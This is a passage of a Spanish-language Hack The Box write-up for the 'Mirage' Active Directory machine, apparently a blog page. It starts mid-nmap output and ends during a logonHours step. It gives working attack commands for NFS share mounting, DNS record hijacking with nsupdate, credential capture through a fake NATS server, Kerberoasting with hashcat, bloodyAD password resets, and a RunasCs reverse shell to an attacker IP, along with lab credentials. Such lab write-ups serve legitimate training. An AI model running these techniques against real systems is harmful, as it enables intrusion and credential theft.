+</span></span><span class="line"><span class="cl">SF:LL,1D2,<span class="s2">&#34;INFO\x20{\&#34;server_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:2UA7GZ23H6BFSXI26M\&#34;,\&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II5
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:7L6M4X2UA7GZ23H6BFSXI26M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_c
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ommit\&#34;:\&#34;a82cfda\&#34;,\&#34;go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;por
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:t\&#34;:4222,\&#34;headers\&#34;:true,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:104857
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:6,\&#34;jetstream\&#34;:true,\&#34;client_id\&#34;:2713,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&#34;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\r\n</span>-ERR<span class="se">\x</span>20<span class="s1">&#39;Authentication\x20Timeout&#39;</span><span class="se">\r\n</span><span class="s2">&#34;)%r(GenericLines,1D3,
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&#34;</span>INFO<span class="se">\x</span>20<span class="o">{</span><span class="se">\&#34;</span>server_id<span class="se">\&#34;</span>:<span class="se">\&#34;</span>NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ2
+</span></span><span class="line"><span class="cl">SF:3H6BFSXI26M<span class="se">\&#34;</span>,<span class="se">\&#34;</span>server_name<span class="se">\&#34;</span>:<span class="se">\&#34;</span>NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2
+</span></span><span class="line"><span class="cl">SF:UA7GZ23H6BFSXI26M<span class="se">\&#34;</span>,<span class="se">\&#34;</span>version<span class="se">\&#34;</span>:<span class="se">\&#34;</span>2<span class="se">\.</span>11<span class="se">\.</span>3<span class="se">\&#34;</span>,<span class="se">\&#34;</span>proto<span class="se">\&#34;</span>:1,<span class="se">\&#34;</span>git_commit<span class="se">\&#34;</span>
+</span></span><span class="line"><span class="cl">SF::<span class="se">\&#34;</span>a82cfda<span class="se">\&#34;</span>,<span class="se">\&#34;</span>go<span class="se">\&#34;</span>:<span class="se">\&#34;</span>go1<span class="se">\.</span>24<span class="se">\.</span>2<span class="se">\&#34;</span>,<span class="se">\&#34;</span>host<span class="se">\&#34;</span>:<span class="se">\&#34;</span>0<span class="se">\.</span>0<span class="se">\.</span>0<span class="se">\.</span>0<span class="se">\&#34;</span>,<span class="se">\&#34;</span>port<span class="se">\&#34;</span>:422
+</span></span><span class="line"><span class="cl">SF:2,<span class="se">\&#34;</span>headers<span class="se">\&#34;</span>:true,<span class="se">\&#34;</span>auth_required<span class="se">\&#34;</span>:true,<span class="se">\&#34;</span>max_payload<span class="se">\&#34;</span>:1048576,<span class="se">\&#34;</span>jet
+</span></span><span class="line"><span class="cl">SF:stream<span class="se">\&#34;</span>:true,<span class="se">\&#34;</span>client_id<span class="se">\&#34;</span>:2714,<span class="se">\&#34;</span>client_ip<span class="se">\&#34;</span>:<span class="se">\&#34;</span>10<span class="se">\.</span>10<span class="se">\.</span>15<span class="se">\.</span>254<span class="se">\&#34;</span>,<span class="se">\&#34;</span>xk
+</span></span><span class="line"><span class="cl">SF:ey<span class="se">\&#34;</span>:<span class="se">\&#34;</span>XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL<span class="se">\&#34;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\
+</span></span></span><span class="line"><span class="cl">SF:r<span class="se">\n</span>-ERR<span class="se">\x</span>20<span class="s1">&#39;Authorization\x20Violation&#39;</span><span class="se">\r\n</span><span class="s2">&#34;)%r(GetRequest,1D3,&#34;</span>INFO<span class="se">\x</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl">SF:0<span class="o">{</span><span class="se">\&#34;</span>server_id<span class="se">\&#34;</span>:<span class="se">\&#34;</span>NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI
+</span></span><span class="line"><span class="cl">SF:26M<span class="se">\&#34;</span>,<span class="se">\&#34;</span>server_name<span class="se">\&#34;</span>:<span class="se">\&#34;</span>NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H
+</span></span><span class="line"><span class="cl">SF:6BFSXI26M<span class="se">\&#34;</span>,<span class="se">\&#34;</span>version<span class="se">\&#34;</span>:<span class="se">\&#34;</span>2<span class="se">\.</span>11<span class="se">\.</span>3<span class="se">\&#34;</span>,<span class="se">\&#34;</span>proto<span class="se">\&#34;</span>:1,<span class="se">\&#34;</span>git_commit<span class="se">\&#34;</span>:<span class="se">\&#34;</span>a82cf
+</span></span><span class="line"><span class="cl">SF:da<span class="se">\&#34;</span>,<span class="se">\&#34;</span>go<span class="se">\&#34;</span>:<span class="se">\&#34;</span>go1<span class="se">\.</span>24<span class="se">\.</span>2<span class="se">\&#34;</span>,<span class="se">\&#34;</span>host<span class="se">\&#34;</span>:<span class="se">\&#34;</span>0<span class="se">\.</span>0<span class="se">\.</span>0<span class="se">\.</span>0<span class="se">\&#34;</span>,<span class="se">\&#34;</span>port<span class="se">\&#34;</span>:4222,<span class="se">\&#34;</span>head
+</span></span><span class="line"><span class="cl">SF:ers<span class="se">\&#34;</span>:true,<span class="se">\&#34;</span>auth_required<span class="se">\&#34;</span>:true,<span class="se">\&#34;</span>max_payload<span class="se">\&#34;</span>:1048576,<span class="se">\&#34;</span>jetstream<span class="se">\&#34;</span>
+</span></span><span class="line"><span class="cl">SF::true,<span class="se">\&#34;</span>client_id<span class="se">\&#34;</span>:2715,<span class="se">\&#34;</span>client_ip<span class="se">\&#34;</span>:<span class="se">\&#34;</span>10<span class="se">\.</span>10<span class="se">\.</span>15<span class="se">\.</span>254<span class="se">\&#34;</span>,<span class="se">\&#34;</span>xkey<span class="se">\&#34;</span>:<span class="se">\&#34;</span>X
+</span></span><span class="line"><span class="cl">SF:C3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL<span class="se">\&#34;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\r\n</span>-ERR<span class="se">\
+</span></span></span><span class="line"><span class="cl">SF:x20<span class="s1">&#39;Authorization\x20Violation&#39;</span><span class="se">\r\n</span><span class="s2">&#34;)%r(HTTPOptions,1D3,&#34;</span>INFO<span class="se">\x</span>20<span class="o">{</span><span class="se">\&#34;</span>ser
+</span></span><span class="line"><span class="cl">SF:ver_id<span class="se">\&#34;</span>:<span class="se">\&#34;</span>NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M<span class="se">\&#34;</span>,<span class="se">\
+</span></span></span><span class="line"><span class="cl">SF:<span class="s2">&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:6M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cfda\&#34;,\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;headers\&#34;:t
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:rue,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34;:true,\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:&#34;</span>client_id<span class="se">\&#34;</span>:2716,<span class="se">\&#34;</span>client_ip<span class="se">\&#34;</span>:<span class="se">\&#34;</span>10<span class="se">\.</span>10<span class="se">\.</span>15<span class="se">\.</span>254<span class="se">\&#34;</span>,<span class="se">\&#34;</span>xkey<span class="se">\&#34;</span>:<span class="se">\&#34;</span>XC3AIA5L
+</span></span><span class="line"><span class="cl">SF:H4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL<span class="se">\&#34;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\r\n</span>-ERR<span class="se">\x</span>20<span class="s1">&#39;Aut
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:horization\x20Violation&#39;</span><span class="se">\r\n</span><span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2025-07-21T21:52:27
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: 6h59m47s
+</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   3.1.1: 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled and required
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds
+</span></span></span></code></pre></div><h1 id="nfs-misconfig">NFS Misconfig<a hidden class="anchor" aria-hidden="true" href="#nfs-misconfig">#</a></h1>
+<p>Vemos que el dominio tiene el puerto 111 (NFS) abierto y como no tenemos nada más por donde tirar, vamos ver que contiene, y en el caso de que podamos y haya algún tipo de archivo, descargarnos-lo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">showmount -e 10.10.11.78
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mkdir MirageReports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo mount -t nfs 10.10.11.78:/ ./MirageReports -o nolock
+</span></span></code></pre></div><p><img alt="mirage_machine_1" loading="lazy" src="/img/mirage/mirage_machine_1.png"></p>
+<p>Vemos que tenemos dos pdf que parecen interesantes, con lo cual nos los descargamos a la máquina y desmontamos el NFS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo umount MirageReports
+</span></span></code></pre></div><p><img alt="mirage_machine_2" loading="lazy" src="/img/mirage/mirage_machine_2.png"></p>
+<p>Y ahora como el archivo lo he sacado como root le asigno de propietario a mi usuario normal para trabajar más cómodamente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo chown borhub:borhub Incident_Report_Missing_DNS_Record_nats-svc.pdf Mirage_Authentication_Hardening_Report.pdf
+</span></span></code></pre></div><p><img alt="mirage_machine_3" loading="lazy" src="/img/mirage/mirage_machine_3.png"></p>
+<h2 id="authenticación_hardening_report">Authenticación_Hardening_Report<a hidden class="anchor" aria-hidden="true" href="#authenticación_hardening_report">#</a></h2>
+<p>Este pdf viene por parte del equipo de seguridad de AD, en el que indican que la autenticación NTLM esta siendo desactivada de todos los dispositivos y aplicaciones que usan esta autenticación para sustituirla por Kerberos.</p>
+<p><img alt="mirage_machine_4" loading="lazy" src="/img/mirage/mirage_machine_4.png"></p>
+<h2 id="report_missing_dns_record_nats_svc">Report_Missing_DNS_Record_nats_svc<a hidden class="anchor" aria-hidden="true" href="#report_missing_dns_record_nats_svc">#</a></h2>
+<p>Este siguiente reporte, proviene del equipo de infraestructura de la red. Y en el se comenta que habían tenido problemas con el <code>hostname nats-svc.mirage.htb</code> ya que había sido eliminado automáticamente porque el registro no había sido actualizado en un plazo de 14 días. Hasta este momento nosotros no sabíamos sobre la existencia de esta dirección, y se comenta que este hostname es crítico para el sistema interno de comunicación con el sistema de <code>mensajería</code> del sistema <code>NATS</code> alojado en el dominio Mirage.</p>
+<ul>
+<li>Descubrimos nueva dirección hostname que ha sido <strong>eliminada</strong> : <code>nats-svc.mirage.htb</code>.</li>
+<li>Se usa como sistema de mensajería interna <code>NATS</code>.</li>
+</ul>
+<p><img alt="mirage_machine_5" loading="lazy" src="/img/mirage/mirage_machine_5.png"></p>
+<p>También al final del pdf, encontramos que puntualizan un posible vector de ataque:</p>
+<blockquote>
+<p>En entornos de desarrollo, los nombres de servicio fijos, como nats-svc.mirage.htb, a menudo se codifican de forma rígida en las aplicaciones.</p>
+<p>Si falta el registro DNS, algunas aplicaciones pueden seguir intentando conectarse a ese nombre. Este comportamiento podría ser objeto de abuso por parte de los atacantes si se secuestran los registros DNS.</p>
+</blockquote>
+<p><img alt="mirage_machine_6" loading="lazy" src="/img/mirage/mirage_machine_6.png"></p>
+<p>Entonces, para ponernos en contexto tenemos los siguientes puntos clave:</p>
+<ul>
+<li>
+<p>Registro nats-svc ha sido removido del servidor.</p>
+</li>
+<li>
+<p>Posiblemente quede algún servició que aún siga resolviendo a hostname para autenticarse.</p>
+</li>
+</ul>
+<h1 id="dynamic-dns-updates">Dynamic DNS Updates<a hidden class="anchor" aria-hidden="true" href="#dynamic-dns-updates">#</a></h1>
+<blockquote>
+<p><strong>Windows Server permite (por diseño) que ciertos hosts hagan “Dynamic DNS Updates”</strong> para registrar registros tipo A sin credenciales <em>si se cumplen ciertas condiciones</em>.</p>
+</blockquote>
+<p>Muchos controladores de dominio permiten por defecto que:</p>
+<ul>
+<li>
+<p>Cualquier máquina unida al dominio pueda registrar un nombre nuevo (en el caso de que no exista).</p>
+</li>
+<li>
+<p>A veces, incluso hosts que no están unidos al dominio pueden registrar nombres <strong>si no están en uso</strong>,
+gracias a cómo está configurado el servidor DNS (con actualizaciones dinámicas habilitadas).</p>
+</li>
+</ul>
+<p>Entonces ahora que ya tenemos el vector de ataque identificado, vamos a usar la herramienta <code>nsupdate</code> para enviar una petición DNS dinámica al DC y crear un registro A.</p>
+<p>Creamos un archivo llamado <code>update.txt</code> en que vamos a añadir las instrucciones que le lanzaremos al DC:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cat update.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">server 10.10.11.78
+</span></span><span class="line"><span class="cl">update add nats-svc.mirage.htb. <span class="m">3600</span> A 10.10.14.51
+</span></span><span class="line"><span class="cl">send
+</span></span></code></pre></div><p>Luego lanzamos el comando con el archivo .txt, en la salida haciendo uso de <code>-d</code> vemos que se envia la actualización a la ip 10.10.11.78 y que nos devuelve la query con un UPDATE:1.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nsupdate -v -d update.txt
+</span></span></code></pre></div><p><img alt="mirage_machine_7" loading="lazy" src="/img/mirage/mirage_machine_7.png"></p>
+<p>Al parecer el comando ha funcionado pero lo comprobamos con <code>dig</code> y con <code>nslookup</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig @10.10.11.78 nats-svc.mirage.htb A +short
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ nslookup
+</span></span><span class="line"><span class="cl">&gt; server 10.10.11.78
+</span></span><span class="line"><span class="cl">Default server: 10.10.11.78
+</span></span><span class="line"><span class="cl">Address: 10.10.11.78#53
+</span></span><span class="line"><span class="cl">&gt; nats-svc.mirage.htb
+</span></span><span class="line"><span class="cl">Server:		10.10.11.78
+</span></span><span class="line"><span class="cl">Address:	10.10.11.78#53
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name:	nats-svc.mirage.htb
+</span></span><span class="line"><span class="cl">Address: 10.10.14.51
+</span></span><span class="line"><span class="cl">&gt; 
+</span></span></code></pre></div><p><img alt="mirage_machine_8" loading="lazy" src="/img/mirage/mirage_machine_8.png"></p>
+<p>Ahora con las comprobaciones solo nos queda recibir las peticiones haciendo uso de un script simulando un servidor nats:</p>
+<p><img alt="mirage_machine_9" loading="lazy" src="/img/mirage/mirage_machine_9.png"></p>
+<pre tabindex="0"><code>CONNECT {&#34;verbose&#34;:false,&#34;pedantic&#34;:false,&#34;user&#34;:&#34;Dev_Account_A&#34;,&#34;pass&#34;:&#34;hx5h7F5554fP@1337!&#34;,&#34;tls_required&#34;:false,&#34;name&#34;:&#34;NATS CLI Version 0.2.2&#34;,&#34;lang&#34;:&#34;go&#34;,&#34;version&#34;:&#34;1.41.1&#34;,&#34;protocol&#34;:1,&#34;echo&#34;:true,&#34;headers&#34;:false,&#34;no_responders&#34;:false}
+</code></pre><h2 id="nats-enumeration">Nats Enumeration<a hidden class="anchor" aria-hidden="true" href="#nats-enumeration">#</a></h2>
+<blockquote>
+<p>Nats es un sistema de mensajería de código abierto.</p>
+</blockquote>
+<p>Primero añadimos un contexto con la url del servidor y las credenciales.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nats context add nats-serv --server nats://dc01.mirage.htb:4222 --user Dev_Account_A --password <span class="s1">&#39;hx5h7F5554fP@1337!&#39;</span> --selectV
+</span></span></code></pre></div><p><img alt="mirage_machine_10" loading="lazy" src="/img/mirage/mirage_machine_10.png"></p>
+<p>Veo un stream llamado auth_logs</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nats stream ls
+</span></span></code></pre></div><p><img alt="mirage_machine_11" loading="lazy" src="/img/mirage/mirage_machine_11.png"></p>
+<p>Con lo cual voy a hacer un nuevo consumer en el stream auth_logs para tratar de leer los mensajes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nats consumer add auth_logs myreader --deliver all --ack explicit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nats consumer next auth_logs myreader --count<span class="o">=</span><span class="m">5</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_12" loading="lazy" src="/img/mirage/mirage_machine_12.png"></p>
+<p>Vemos que tenemos al parecer unas credenciales de david.jjackson:&ldquo;pN8kQmn6b86!1234@&rdquo;. Con lo cual las vamos a comprobar con <code>nxc</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -u 10.10.11.78
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc ldap mirage.htb -u david.jjackson -p <span class="s1">&#39;pN8kQmn6b86!1234@&#39;</span> -k
+</span></span></code></pre></div><p><img alt="mirage_machine_13" loading="lazy" src="/img/mirage/mirage_machine_13.png"></p>
+<h1 id="bloodhound-enumeration">Bloodhound Enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<p>Anteriormente habíamos visto que la autenticación NTLM estaba descativada, con lo cual vamos a sacar un TGT (Ticket Garanting Ticket) para el usuario david.jjackson.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py mirage.htb/david.jjackson:<span class="s1">&#39;pN8kQmn6b86!1234@&#39;</span> -dc-ip 10.10.11.78
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/Mirage/EXPLOITS/david.jjackson.ccache
+</span></span></code></pre></div><p><img alt="mirage_machine_14" loading="lazy" src="/img/mirage/mirage_machine_14.png"></p>
+<p>Una vez con el ticket obtenido, ya lanzamos el escaneo con <code>bloodhound-python</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -u <span class="s1">&#39;david.jjackson&#39;</span> -k -no-pass -d MIRAGE.HTB -ns 10.10.11.78 -dc DC01.mirage.htb -c all --zip --auth-method kerberos
+</span></span></code></pre></div><p><img alt="mirage_machine_15" loading="lazy" src="/img/mirage/mirage_machine_15.png"></p>
+<p>Mirando el bloodhound no veo nada interesante en cuanto a los permisos del usuario david.jjackson, con lo cual pruebo a lanzar un ataque kerberoast para ver si recibimos algún hash kerbero.</p>
+<h2 id="ataque-kerbereoast">Ataque Kerbereoast<a hidden class="anchor" aria-hidden="true" href="#ataque-kerbereoast">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.78 --dc-host DC01.mirage.htb -d <span class="s1">&#39;MIRAGE.HTB&#39;</span> -u <span class="s1">&#39;david.jjackson&#39;</span> --no-pass -k
+</span></span></code></pre></div><p><img alt="mirage_machine_16" loading="lazy" src="/img/mirage/mirage_machine_16.png"></p>
+<p>Y ahora vamos a probar a craquear el TGS (Ticket Garantig Service) con <code>hashcat</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> --force -a <span class="m">0</span> hash_kerbero /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force -O
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nathan.aadam:<span class="s1">&#39;3edc#EDC3&#39;</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_17" loading="lazy" src="/img/mirage/mirage_machine_17.png"></p>
+<h1 id="shell-as-nathanaadam">Shell as nathan.aadam<a hidden class="anchor" aria-hidden="true" href="#shell-as-nathanaadam">#</a></h1>
+<p>Pedimos otro TGT para el usuario nathan.aadam.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py mirage.htb/nathan.aadam:<span class="s1">&#39;3edc#EDC3&#39;</span> -dc-ip 10.10.11.78
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/workspace/HTB/Mirage/CONTENT/nathan.aadam.ccache
+</span></span></code></pre></div><p><img alt="mirage_machine_18" loading="lazy" src="/img/mirage/mirage_machine_18.png"></p>
+<p>Ahora con evil-winrm vamos a ganarnos una shell como el usuario nathan.</p>
+<p><img alt="mirage_machine_19" loading="lazy" src="/img/mirage/mirage_machine_19.png"></p>
+<p>Miramos los permisos en bloodhound y vemos que es miembro de varios grupos, pero no tiene ningún permiso sobre otros usuarios. Con lo cual voy a subir un winPEAS para realizar un escaneo al sistema.</p>
+<h2 id="winpeas-enum---autologon-credentials">WinPeas Enum - AutoLogon Credentials<a hidden class="anchor" aria-hidden="true" href="#winpeas-enum---autologon-credentials">#</a></h2>
+<p>Mirando el resultado, veo que hay unas credenciales en el <code>AutoLogon</code>:</p>
+<pre tabindex="0"><code>mark.bbond:1day@atime
+</code></pre><p><img alt="mirage_machine_20" loading="lazy" src="/img/mirage/mirage_machine_20.png"></p>
+<p>Ahora comprobamos las credenciales con nxc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap mirage.htb -u mark.bbond -p <span class="s1">&#39;1day@atime&#39;</span> -k
+</span></span></code></pre></div><p><img alt="mirage_machine_21" loading="lazy" src="/img/mirage/mirage_machine_21.png"></p>
+<p>Y Pedimos un TGT para el usuario mark.bbond:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py mirage.htb/mark.bbond:<span class="s1">&#39;1day@atime&#39;</span> -dc-ip 10.10.11.78
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/Mirage/CONTENT/mark.bbond.ccache
+</span></span></code></pre></div><p><img alt="mirage_machine_22" loading="lazy" src="/img/mirage/mirage_machine_22.png"></p>
+<h1 id="as-markbbond">As mark.bbond<a hidden class="anchor" aria-hidden="true" href="#as-markbbond">#</a></h1>
+<h2 id="abusando-de-permisos-forcechangepassword---bloodyad">Abusando de permisos ForceChangePassword - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-forcechangepassword---bloodyad">#</a></h2>
+<p>Mirando los permisos sobre otros usuarios de <code>mark.bbond</code> vemos que tiene permisos <code>ForceChangePassword</code> sobre <code>javier.mmarshall</code>.</p>
+<p><img alt="mirage_machine_23" loading="lazy" src="/img/mirage/mirage_machine_23.png"></p>
+<p>Entonces lo primero que realizamos es cambiar la contraseña del ususario:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host DC01.mirage.htb -d mirage.htb -k -u <span class="s1">&#39;mark.bbond&#39;</span> -p <span class="s1">&#39;1day@atime&#39;</span> <span class="nb">set</span> password <span class="s1">&#39;javier.mmarshall&#39;</span> <span class="s1">&#39;Password!&#39;</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_24" loading="lazy" src="/img/mirage/mirage_machine_24.png"></p>
+<h2 id="deshabilitar-accountdisabled---bloodyad">Deshabilitar ACCOUNTDISABLED - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#deshabilitar-accountdisabled---bloodyad">#</a></h2>
+<p>Ahora, nos hemos encontrado con que este usuario esta desactivado con lo cual vamos a activarlo.7</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host DC01.mirage.htb -d mirage.htb -k -u <span class="s1">&#39;mark.bbond&#39;</span> -p <span class="s1">&#39;1day@atime&#39;</span> remove uac <span class="s1">&#39;javier.mmarshall&#39;</span> -f ACCOUNTDISABLE
+</span></span></code></pre></div><p><img alt="mirage_machine_25" loading="lazy" src="/img/mirage/mirage_machine_25.png"></p>
+<p>Pero ahora si intentamos obtener un tgt o comprobar las credenciales con nxc, recibimos el error <code>KDC_ERR_CLIENT_REVOKED</code>.</p>
+<p><img alt="mirage_machine_26" loading="lazy" src="/img/mirage/mirage_machine_26.png"></p>
+<h2 id="restricción-logonhours-del-usuario-javiermmarshall">Restricción LogonHours del usuario javier.mmarshall<a hidden class="anchor" aria-hidden="true" href="#restricción-logonhours-del-usuario-javiermmarshall">#</a></h2>
+<p>Con <code>bloodyAD</code> vamos a revisar que tenemos la restricción de <code>logonHours</code>, ademas vemos que no hay ninguna hora en la que podamos loggearnos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host DC01.mirage.htb -d mirage.htb -k -u <span class="s1">&#39;mark.bbond&#39;</span> -p <span class="s1">&#39;1day@atime&#39;</span> get object javier.mmarshall --attr logonHours
+</span></span></code></pre></div><p><img alt="mirage_machine_27" loading="lazy" src="/img/mirage/mirage_machine_27.png"></p>
+<p>Ahora, para poder cambiar esta restricción vamos a tener que abrirnos una <code>rev shell</code> con <code>RunasCs</code> con el usuario <code>mark.bbond</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.<span class="se">\R</span>unasCs.exe mark.bbond <span class="s1">&#39;1day@atime&#39;</span> powershell -r 10.10.14.51:4444
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_28" loading="lazy" src="/img/mirage/mirage_machine_28.png"></p>
+<p><img alt="mirage_machine_29" loading="lazy" src="/img/mirage/mirage_machine_29.png"></p>
+<p>Si volvemos a mirar el objeto logonHours en powershell, vemos que nos sale todo 0. Esto nos indica que no tiene ninguna hora configurada para poder iniciar sesión.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="n">javier</span><span class="p">.</span><span class="py">mmarshall</span> <span class="n">-Properties</span> <span class="n">logonHours</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">logonHours</span>
+</span></span></code></pre></div><p><img alt="mirage_machine_30" loading="lazy" src="/img/mirage/mirage_machine_30.png"></p>
+<p>Ahora vamos a limpiar ese registro del logonHours para que nos deje iniciar sesión siempre. Cuando volvemos a mirar las propiedades de logonHours con Get-ADUsers ja no nos sale nada.</p>
